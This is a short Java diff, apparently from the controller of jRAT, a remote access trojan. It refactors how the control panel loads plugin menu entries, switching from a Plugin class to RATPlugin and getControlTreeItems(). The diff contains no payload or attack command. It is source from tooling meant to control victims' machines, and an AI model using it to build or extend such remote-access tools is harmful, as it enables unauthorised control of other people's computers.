@@ -35,10 +35,10 @@ import javax.swing.tree.DefaultTreeModel;
 
 import jrat.api.BaseControlPanel;
 import jrat.api.RATControlMenuEntry;
+import jrat.api.RATPlugin;
 import se.jrat.common.script.Script;
 import se.jrat.controller.Constants;
 import se.jrat.controller.Slave;
-import se.jrat.controller.addons.Plugin;
 import se.jrat.controller.addons.PluginLoader;
 import se.jrat.controller.addons.RATObjectFormat;
 import se.jrat.controller.exceptions.ControlPanelLoadException;
@@ -116,8 +116,8 @@ public class FrameControlPanel extends BaseFrame {
 
 	public void loadItems() {
 		if (entries.size() == 0) {
-			for (Plugin p : PluginLoader.plugins) {
-				for (RATControlMenuEntry entry : p.getControlItems()) {
+			for (RATPlugin p : PluginLoader.getPlugins()) {
+				for (RATControlMenuEntry entry : p.getControlTreeItems()) {
 					entries.add(entry);
 				}
 			}
